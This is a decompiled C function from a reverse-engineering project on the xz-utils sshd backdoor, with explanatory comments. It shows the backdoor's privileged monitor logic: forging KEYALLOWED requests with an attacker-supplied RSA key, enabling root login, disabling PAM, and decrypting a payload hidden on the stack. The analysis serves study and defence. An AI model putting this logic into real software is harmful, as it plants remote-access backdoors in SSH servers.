// /home/kali/xzre-ghidra/xzregh/108270_sshd_proxy_elevate.c
// Function: sshd_proxy_elevate @ 0x108270
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_proxy_elevate(monitor_data_t * args, global_context_t * ctx)


/*
 * AutoDoc: Implements the privileged side of the monitor command channel. It validates the supplied RSA components, command flags,
 * and libc/import tables; rejects unsupported command types; and decides whether PAM should be disabled or sshd should
 * exit outright based on the flag bits. For KEYALLOWED-style payloads it hunts for the staged ChaCha-wrapped blob on the
 * stack, decrypts and hashes it, emits a forged `MONITOR_REQ_KEYALLOWED` packet (creating temporary BIGNUM/RSA objects
 * populated with the attacker's modulus/exponent), and writes it over the selected monitor socket or the fd discovered via
 * `sshd_get_client_socket`. After sending optional sshbuf payloads it drains replies, honours "wait" vs "fire-and-forget"
 * semantics, and updates the monitor request IDs so sshd's dispatcher believes the forged exchange was legitimate.
 */

#include "xzre_types.h"

BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)

{
  u8 current_byte;
  char expected_digest_byte;
  uint cmd_type;
  imported_funcs_t *imports;
  libc_imports_t *libc_funcs;
  sshd_ctx_t *sshd_ctx;
  long *payload_header;
  u64 *stack_limit;
  pfn_EVP_Digest_t evp_digest;
  BOOL success;
  uint uVar11;
  int status;
  cmd_arguments_t *cmd_args;
  long *payload_scan_end;
  ssize_t io_result;
  int *errno_slot;
  RSA *rsa_ctx;
  BIGNUM *rsa_e_bn;
  BIGNUM *rsa_n_bn;
  BIGNUM *rsa_d_bn;
  EVP_MD *digest_type;
  long loop_idx;
  byte extraout_DL;
  size_t payload_size;
  byte monitor_flag_mask;
  uint socket_index;
  u64 *stack_slot;
  u64 payload_room;
  uint *puVar23;
  ulong *puVar24;
  sshbuf *psVar25;
  uint *request_words;
  undefined4 *puVar27;
  uchar *puVar28;
  uint *puVar29;
  size_t *psVar30;
  u8 *puVar31;
  char *rsa_alg_name;
  ulong payload_remaining;
  long *stack_candidate;
  long digest_idx;
  byte bVar35;
  u8 monitor_request [1800];
  cmd_arguments_t *cmd_flags;
  RSA *rsa_tmp;
  uchar rsa_exponent_byte;
  int monitor_fd;
  uint rsa_signature_len;
  u64 serialized_chunk_len;
  BIGNUM *rsa_components[2];
  uchar rsa_message_digest[32];
  u64 rsa_modulus_qword0;
  u64 rsa_modulus_qword1;
  uint rsa_modulus_words[57];
  uchar rsa_modulus_shift;
  uchar rsa_modulus_flag;
  ulong rsa_signature_block[2];
  uint sshbuf_tmp_words[60];
  sshbuf sshbuf_vec[4];
  uint netlen_tmp[2];
  uchar netlen_tmp_pad;
  uchar netlen_tmp_pad_hi[7];
  uchar payload_hash [32];
  uint rsa_template_words[66];
  uint monitor_req_len_prefix;
  uint monitor_req_digest_len;
  uint monitor_req_payload_len;
  uchar monitor_req_prefix_bytes[3];
  uchar monitor_req_prefix_pad;
  uchar monitor_req_prefix_pad_hi[3];
  uint monitor_req_header_words[5];
  uchar monitor_req_frame[399];
  u8 monitor_req_payload[1868];
  
  bVar35 = 0;
  monitor_req_header_words[0] = 0;
  monitor_req_header_words[1] = 0;
  monitor_req_header_words[2] = 0;
  monitor_req_header_words[3] = 0;
  request_words = monitor_req_header_words + 4;
  for (loop_idx = 0x236; loop_idx != 0; loop_idx = loop_idx + -1) {
    *request_words = 0;
    request_words = request_words + 1;
  }
  monitor_fd = -1;
  if (args == (monitor_data_t *)0x0) {
    return FALSE;
  }
  rsa_e_bn = args->rsa_n;
  if (rsa_e_bn == (BIGNUM *)0x0) {
    return FALSE;
  }
  rsa_n_bn = args->rsa_e;
  if (rsa_n_bn == (BIGNUM *)0x0) {
    return FALSE;
  }
  cmd_type = args->cmd_type;
  if ((cmd_type == 3) && ((args->args->monitor_flags & 0x40) == 0)) {
    if (args->rsa == (RSA *)0x0) {
      return FALSE;
    }
    if (args->payload_body == (u8 *)0x0) {
      return FALSE;
    }
    if (args->payload_body_size != 0x30) {
      return FALSE;
    }
  }
  if (ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  imports = ctx->imported_funcs;
  if (imports == (imported_funcs_t *)0x0) {
    return FALSE;
  }
  libc_funcs = ctx->libc_imports;
  if (libc_funcs == (libc_imports_t *)0x0) {
    return FALSE;
  }
  if (libc_funcs->pselect == (pfn_pselect_t)0x0) {
    return FALSE;
  }
  if (libc_funcs->__errno_location == (pfn___errno_location_t)0x0) {
    return FALSE;
  }
  sshd_ctx = ctx->sshd_ctx;
  // AutoDoc: Before the mm hooks land, only the minimal control-plane commands are accepted; anything needing KEYALLOWED is rejected.
  if (sshd_ctx->have_mm_answer_keyallowed == FALSE) {
    if (cmd_type == 0) {
      return FALSE;
    }
    cmd_args = args->args;
    if (cmd_type != 3) {
      if (cmd_args == (cmd_arguments_t *)0x0) {
        if (cmd_type != 1) goto LAB_0010845f;
      }
      else if (cmd_type != 1) {
        if (cmd_type == 2) goto LAB_0010845f;
        goto LAB_00108447;
      }
      goto LAB_0010843f;
    }
    if ((cmd_args->request_flags & 0x20) != 0) {
      return FALSE;
    }
LAB_0010844c:
    current_byte = cmd_args->field_0x3;
LAB_00108450:
    if ((char)current_byte < '\0') goto LAB_0010845f;
  }
  else {
    cmd_args = args->args;
    if (cmd_args == (cmd_arguments_t *)0x0) {
      if (cmd_type == 0) goto LAB_00108434;
      if (cmd_type != 1) {
LAB_00108447:
        if (cmd_type != 3) goto LAB_0010845f;
        goto LAB_0010844c;
      }
    }
    else if (cmd_type != 1) {
      if (cmd_type == 2) goto LAB_0010845f;
      if (cmd_type != 0) goto LAB_00108447;
LAB_00108434:
      current_byte = cmd_args->monitor_flags;
      goto LAB_00108450;
    }
LAB_0010843f:
    if ((cmd_args->monitor_flags & 1) != 0) goto LAB_0010845f;
  }
  *sshd_ctx->permit_root_login_ptr = 3;
LAB_0010845f:
  if ((args->cmd_type < 2) || (args->cmd_type == 3)) {
    if ((cmd_args->control_flags & 0x40) != 0) {
      if (sshd_ctx->use_pam_ptr == (int *)0x0) {
        return FALSE;
      }
      *sshd_ctx->use_pam_ptr = 0;
    }
    // AutoDoc: PRIV/EXIT payloads hunt the stack for the staged ChaCha blob, verify its hash, and decrypt it in place before forging the monitor request.
    if ((args->cmd_type == 3) && (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != 0xc0)) {
      if (monitor_flag_mask == 0x40) {
        if (libc_funcs->exit == (pfn_exit_t)0x0) {
          return FALSE;
        }
        // AutoDoc: Command type 2 asks libc's `exit()` to terminate sshd once the exchange is done.
        (*libc_funcs->exit)(0);
        return FALSE;
      }
      if (args->payload_body_size < 0x30) {
        return FALSE;
      }
      payload_header = (long *)args->payload_body;
      loop_idx = *payload_header;
      payload_size = payload_header[1];
      if (0x3fef < payload_size - 0x11) {
        return FALSE;
      }
      stack_limit = (undefined8 *)libc_funcs->__libc_stack_end;
      stack_slot = (undefined8 *)register0x00000020;
      do {
        if (stack_limit <= stack_slot) {
          return FALSE;
        }
        stack_candidate = (long *)*stack_slot;
        if ((long *)0xffffff < stack_candidate) {
          success = is_range_mapped((u8 *)stack_candidate,0x4001 - payload_size,ctx);
          if (success != FALSE) {
            payload_scan_end = (long *)((0x4001 - payload_size) + (long)stack_candidate);
            for (; stack_candidate < payload_scan_end; stack_candidate = (long *)((long)stack_candidate + 1)) {
              netlen_tmp[0] = 0;
              netlen_tmp[1] = 0;
              netlen_tmp_pad = 0;
              netlen_tmp_pad_hi = 0;
              payload_hash[0] = '\0';
              payload_hash[1] = '\0';
              payload_hash[2] = '\0';
              payload_hash[3] = '\0';
              payload_hash[4] = '\0';
              payload_hash[5] = '\0';
              payload_hash[6] = '\0';
              payload_hash[7] = '\0';
              payload_hash[8] = '\0';
              payload_hash[9] = '\0';
              payload_hash[10] = '\0';
              payload_hash[0xb] = '\0';
              payload_hash[0xc] = '\0';
              payload_hash[0xd] = '\0';
              payload_hash[0xe] = '\0';
              payload_hash[0xf] = '\0';
              if ((*stack_candidate == loop_idx) &&
                 (success = sha256(stack_candidate,payload_size,(u8 *)netlen_tmp,0x20,ctx->imported_funcs),
                 success != FALSE)) {
                digest_idx = 0;
                while( TRUE ) {
                  expected_digest_byte = *(char *)((long)payload_header + digest_idx + 0x10);
                  current_byte = *(u8 *)((long)netlen_tmp + digest_idx);
                  if ((expected_digest_byte < (char)current_byte) || ((char)current_byte < expected_digest_byte)) break;
                  digest_idx = digest_idx + 1;
                  if (digest_idx == 0x20) {
                    netlen_tmp[0] = 0;
                    netlen_tmp[1] = 0;
                    netlen_tmp_pad = 0;
                    netlen_tmp_pad_hi = 0;
                    puVar28 = payload_hash;
                    for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
                      *puVar28 = '\0';
                      puVar28 = puVar28 + (ulong)bVar35 * -2 + 1;
                    }
                    success = secret_data_get_decrypted((u8 *)netlen_tmp,ctx);
                    if (success == FALSE) {
                      return FALSE;
                    }
                    payload_size = payload_size - 0x10;
                    request_words = (uint *)(stack_candidate + 2);
                    success = chacha_decrypt((u8 *)request_words,(int)payload_size,(u8 *)netlen_tmp,(u8 *)stack_candidate,
                                            (u8 *)request_words,ctx->imported_funcs);
                    if (success == FALSE) {
                      return FALSE;
                    }
                    goto LAB_00108861;
                  }
                }
              }
            }
          }
        }
        stack_slot = stack_slot + 1;
      } while( TRUE );
    }
  }
  rsa_alg_name = ctx->ssh_rsa_cert_alg;
  rsa_signature_block[0] = 0;
  rsa_signature_block[1] = 0;
  request_words = netlen_tmp;
  for (loop_idx = 0x69; loop_idx != 0; loop_idx = loop_idx + -1) {
    *request_words = 0;
    request_words = request_words + 1;
  }
  rsa_exponent_byte = '\x01';
  psVar25 = sshbuf_vec;
  for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
    *(undefined4 *)&psVar25->rsa_d_bn = 0;
    psVar25 = (sshbuf *)((long)&psVar25->rsa_d_bn + 4);
  }
  rsa_signature_len = 0;
  puVar27 = rsa_modulus_words;
  for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
    *puVar27 = 0;
    puVar27 = puVar27 + 1;
  }
  rsa_message_digest[0] = '\0';
  rsa_message_digest[1] = '\0';
  rsa_message_digest[2] = '\0';
  rsa_message_digest[3] = '\0';
  rsa_message_digest[4] = '\0';
  rsa_message_digest[5] = '\0';
  rsa_message_digest[6] = '\0';
  rsa_message_digest[7] = '\0';
  rsa_message_digest[8] = '\0';
  rsa_message_digest[9] = '\0';
  rsa_message_digest[10] = '\0';
  rsa_message_digest[0xb] = '\0';
  rsa_message_digest[0xc] = '\0';
  rsa_message_digest[0xd] = '\0';
  rsa_message_digest[0xe] = '\0';
  rsa_message_digest[0xf] = '\0';
  puVar27 = sshbuf_tmp_words;
  for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
    *puVar27 = 0;
    puVar27 = puVar27 + 1;
  }
  rsa_message_digest[0x10] = '\0';
  rsa_message_digest[0x11] = '\0';
  rsa_message_digest[0x12] = '\0';
  rsa_message_digest[0x13] = '\0';
  rsa_message_digest[0x14] = '\0';
  rsa_message_digest[0x15] = '\0';
  rsa_message_digest[0x16] = '\0';
  rsa_message_digest[0x17] = '\0';
  rsa_message_digest[0x18] = '\0';
  rsa_message_digest[0x19] = '\0';
  rsa_message_digest[0x1a] = '\0';
  rsa_message_digest[0x1b] = '\0';
  rsa_message_digest[0x1c] = '\0';
  rsa_message_digest[0x1d] = '\0';
  rsa_message_digest[0x1e] = '\0';
  rsa_message_digest[0x1f] = '\0';
  rsa_modulus_qword0 = 0;
  rsa_modulus_qword1 = 0;
  if (((rsa_alg_name != (char *)0x0) && (ctx->rsa_sha2_256_alg != (char *)0x0)) &&
     (success = contains_null_pointers(&imports->RSA_new,9), success == FALSE)) {
    request_words = monitor_req_header_words;
    digest_idx = 0;
    payload_remaining = 0;
    netlen_tmp[1] = (uint)extraout_DL;
    netlen_tmp_pad = 2;
    puVar23 = request_words;
    for (loop_idx = 0x23a; loop_idx != 0; loop_idx = loop_idx + -1) {
      *puVar23 = 0;
      puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
    }
    payload_hash[5] = '\0';
    payload_hash[6] = '\0';
    payload_hash[7] = '\0';
    payload_hash[8] = '\x1c';
    rsa_components[0] = rsa_n_bn;
    rsa_modulus_qword0 = CONCAT71((rsa_modulus_qword0 >> 8),0x80);
    rsa_components[1] = rsa_e_bn;
    *(u64 *)(payload_hash + 9) = (undefined7)*(undefined8 *)rsa_alg_name;
    payload_hash[0x10] = (uchar)((ulong)*(undefined8 *)rsa_alg_name >> 0x38);
    *(uint *)(payload_hash + 0x11) = (undefined4)*(undefined8 *)(rsa_alg_name + 8);
    rsa_modulus_shift = 8;
    rsa_modulus_flag = 1;
    *(uint *)(payload_hash + 0x15) = (undefined4)*(undefined8 *)(rsa_alg_name + 0xc);
    *(uint *)(payload_hash + 0x19) = (undefined4)((ulong)*(undefined8 *)(rsa_alg_name + 0xc) >> 0x20);
    stack0xfffffffffffff50d = *(undefined8 *)(rsa_alg_name + 0x14);
    stack_slot = &rsa_modulus_qword0;
    puVar27 = rsa_template_words;
    for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
      *puVar27 = *(undefined4 *)stack_slot;
      stack_slot = (undefined8 *)((long)stack_slot + (ulong)bVar35 * -8 + 4);
      puVar27 = puVar27 + (ulong)bVar35 * -2 + 1;
    }
    payload_room = 0x628;
    monitor_req_len_prefix = 0x1000000;
    monitor_req_payload_len = 0x7000000;
    monitor_req_prefix_bytes = (undefined3)*(undefined4 *)rsa_alg_name;
    monitor_req_prefix_pad = (undefined1)*(undefined4 *)(rsa_alg_name + 3);
    monitor_req_prefix_pad_hi = (undefined3)((uint)*(undefined4 *)(rsa_alg_name + 3) >> 8);
    while( TRUE ) {
      serialized_chunk_len = 0;
      // AutoDoc: Serialise the attacker's exponent and modulus into the monitor frame so sshd sees a well-formed RSA keypair.
      success = bignum_serialize(monitor_req_payload + payload_remaining,payload_room,&serialized_chunk_len,rsa_components[digest_idx],imports);
      if ((success == FALSE) || (payload_room < serialized_chunk_len)) break;
      payload_remaining = payload_remaining + serialized_chunk_len;
      payload_room = payload_room - serialized_chunk_len;
      if (digest_idx != 0) {
        if (0x628 < payload_remaining) {
          return FALSE;
        }
        status = (int)payload_remaining;
        uVar11 = status + 0xb;
        monitor_req_digest_len = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                    uVar11 * 0x1000000;
        uVar11 = status + 0x2a7;
        *(uint *)(payload_hash + 1) =
             uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 * 0x1000000
        ;
        uVar11 = status + 700;
        netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                       uVar11 * 0x1000000;
        imports = ctx->imported_funcs;
        puVar23 = netlen_tmp;
        puVar29 = request_words;
        for (loop_idx = 0x69; loop_idx != 0; loop_idx = loop_idx + -1) {
          *puVar29 = *puVar23;
          puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
          puVar29 = puVar29 + (ulong)bVar35 * -2 + 1;
        }
        rsa_ctx = (*imports->RSA_new)();
        if (rsa_ctx == (RSA *)0x0) {
          return FALSE;
        }
        rsa_e_bn = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
        if (rsa_e_bn != (BIGNUM *)0x0) {
          rsa_n_bn = (*ctx->imported_funcs->BN_bin2bn)((uchar *)&rsa_modulus_qword0,0x100,(BIGNUM *)0x0);
          rsa_d_bn = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
          // AutoDoc: Build a temporary RSA object from the supplied components in order to hash and sign the forged packet.
          status = (*ctx->imported_funcs->RSA_set0_key)(rsa_ctx,rsa_n_bn,rsa_e_bn,rsa_d_bn);
          if (status != 1) goto LAB_00108cd2;
          evp_digest = ctx->imported_funcs->EVP_Digest;
          digest_type = (*ctx->imported_funcs->EVP_sha256)();
          status = (*evp_digest)(monitor_req_frame,payload_remaining + 399,rsa_message_digest,(uint *)0x0,digest_type,(ENGINE *)0x0);
          if (status == 1) {
            status = (*ctx->imported_funcs->RSA_sign)
                               (0x2a0,rsa_message_digest,0x20,(uchar *)rsa_signature_block,&rsa_signature_len,rsa_ctx);
            if ((status == 1) && (rsa_signature_len == 0x100)) {
              sshbuf_vec[0].rsa_d_bn = (u8 *)0xc00000014010000;
              *(uint *)((u8 *)&sshbuf_vec[0].off + 4) = 0x10000;
              sshbuf_vec[0].cd = *(u8 **)ctx->rsa_sha2_256_alg;
              *(uint *)&sshbuf_vec[0].off = *(undefined4 *)(ctx->rsa_sha2_256_alg + 8);
              payload_size = payload_remaining + 0x2c0;
              puVar24 = rsa_signature_block;
              psVar30 = &sshbuf_vec[0].size;
              for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(int *)psVar30 = (int)*puVar24;
                puVar24 = (ulong *)((long)puVar24 + (ulong)bVar35 * -8 + 4);
                psVar30 = (size_t *)((long)psVar30 + (ulong)bVar35 * -8 + 4);
              }
              imports = ctx->imported_funcs;
              psVar25 = sshbuf_vec;
              puVar31 = monitor_req_payload + payload_remaining;
              for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(undefined4 *)puVar31 = *(undefined4 *)&psVar25->rsa_d_bn;
                psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
                puVar31 = puVar31 + ((ulong)bVar35 * -2 + 1) * 4;
              }
              (*imports->RSA_free)(rsa_ctx);
LAB_00108861:
              cmd_args = args->args;
              uVar11 = args->cmd_type;
              if (cmd_args == (cmd_arguments_t *)0x0) {
                return FALSE;
              }
              // AutoDoc: Without an explicit socket override, call `sshd_get_client_socket`; otherwise honour the encoded socket selector bits.
              if ((cmd_args->control_flags & 0x20) == 0) {
                success = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
              }
              else {
                if (uVar11 == 2) {
                  monitor_flag_mask = cmd_args->monitor_flags >> 1;
LAB_001088b7:
                  socket_index = (uint)monitor_flag_mask;
                }
                else if (uVar11 < 3) {
                  if (uVar11 != 0) {
                    monitor_flag_mask = cmd_args->monitor_flags >> 2;
                    goto LAB_001088b7;
                  }
                  socket_index = cmd_args->monitor_flags >> 3 & 0xf;
                }
                else {
                  socket_index = 1;
                  if (uVar11 == 3) {
                    socket_index = cmd_args->request_flags & 0x1f;
                  }
                }
                success = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
              }
              status = monitor_fd;
              if (success == FALSE) {
                return FALSE;
              }
              cmd_args = args->args;
              cmd_type = args->cmd_type;
              libc_funcs = ctx->libc_imports;
              psVar25 = sshbuf_vec;
              for (loop_idx = 0x12; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(undefined4 *)&psVar25->rsa_d_bn = 0;
                psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
              }
              if (monitor_fd < 0) {
                return FALSE;
              }
              if (cmd_args == (cmd_arguments_t *)0x0) {
                return FALSE;
              }
              if (libc_funcs == (libc_imports_t *)0x0) {
                return FALSE;
              }
              if (libc_funcs->exit == (pfn_exit_t)0x0) {
                return FALSE;
              }
              // AutoDoc: COMMAND payloads (and explicit KEYALLOWED continuations) borrow an sshbuf so extra ciphertext can follow the forged frame.
              if ((cmd_type == 0) || ((cmd_type == 3 && ((cmd_args->request_flags & 0x20) != 0)))) {
                success = sshd_get_sshbuf(sshbuf_vec,ctx);
                if (success == FALSE) {
                  return FALSE;
                }
                ctx->exit_flag = cmd_args->control_flags & 1;
              }
              // AutoDoc: Push the forged monitor frame across the target fd; any short write aborts the run.
              io_result = fd_write(status,request_words,payload_size,libc_funcs);
              if (io_result < 0) {
                return FALSE;
              }
              if (cmd_type == 0) {
LAB_001089b5:
                netlen_tmp[1] = netlen_tmp[1] & 0xffffff00;
                payload_size = sshbuf_vec[0].size;
                if (0x40 < sshbuf_vec[0].size) {
                  payload_size = 0x40;
                }
                uVar11 = (int)payload_size + 1;
                netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                               uVar11 * 0x1000000;
                io_result = fd_write(status,netlen_tmp,5,libc_funcs);
                if (io_result < 0) {
                  return FALSE;
                }
                io_result = fd_write(status,sshbuf_vec[0].rsa_d_bn,payload_size,libc_funcs);
                if (io_result < 0) {
                  return FALSE;
                }
                if (cmd_type != 3) goto LAB_0010897e;
              }
              else {
                if (cmd_type != 3) goto LAB_0010897e;
                if ((cmd_args->request_flags & 0x20) != 0) goto LAB_001089b5;
              }
              if (-1 < (char)cmd_args->control_flags) {
                return TRUE;
              }
LAB_0010897e:
              // AutoDoc: When the wait bit is set, read the reply length and drain the monitor socket until sshd finishes responding.
              rsa_signature_block[0] = rsa_signature_block[0] & 0xffffffff00000000;
              io_result = fd_read(status,rsa_signature_block,4,libc_funcs);
              if (io_result < 0) {
                return FALSE;
              }
              uVar11 = (uint)rsa_signature_block[0] >> 0x18 | ((uint)rsa_signature_block[0] & 0xff0000) >> 8 |
                       ((uint)rsa_signature_block[0] & 0xff00) << 8 | (uint)rsa_signature_block[0] << 0x18;
              rsa_signature_block[0] = CONCAT44(*(uint *)((u8 *)&rsa_signature_block[0] + 4),uVar11);
              payload_remaining = (ulong)uVar11;
              if (payload_remaining != 0) {
                if (libc_funcs->read == (pfn_read_t)0x0) {
                  return FALSE;
                }
                if (libc_funcs->__errno_location == (pfn___errno_location_t)0x0) {
                  return FALSE;
                }
                do {
                  while( TRUE ) {
                    payload_size = 0x200;
                    if (payload_remaining < 0x201) {
                      payload_size = payload_remaining;
                    }
                    io_result = (*libc_funcs->read)(status,netlen_tmp,payload_size);
                    if (-1 < io_result) break;
                    errno_slot = (*libc_funcs->__errno_location)();
                    if (*errno_slot != 4) {
                      return FALSE;
                    }
                  }
                  if (io_result == 0) {
                    return FALSE;
                  }
                  payload_remaining = payload_remaining - io_result;
                } while (payload_remaining != 0);
              }
              if (cmd_type != 2) {
                return TRUE;
              }
              if (libc_funcs->exit == (pfn_exit_t)0x0) {
                return FALSE;
              }
              (*libc_funcs->exit)(0);
              return TRUE;
            }
          }
        }
        rsa_n_bn = (BIGNUM *)0x0;
        rsa_e_bn = (BIGNUM *)0x0;
        rsa_d_bn = (BIGNUM *)0x0;
LAB_00108cd2:
        (*ctx->imported_funcs->RSA_free)(rsa_ctx);
        if (rsa_e_bn != (BIGNUM *)0x0) {
          (*ctx->imported_funcs->BN_free)(rsa_e_bn);
        }
        if (rsa_n_bn != (BIGNUM *)0x0) {
          (*ctx->imported_funcs->BN_free)(rsa_n_bn);
        }
        if (rsa_d_bn == (BIGNUM *)0x0) {
          return FALSE;
        }
        (*ctx->imported_funcs->BN_free)(rsa_d_bn);
        return FALSE;
      }
      digest_idx = 1;
    }
  }
  return FALSE;
}

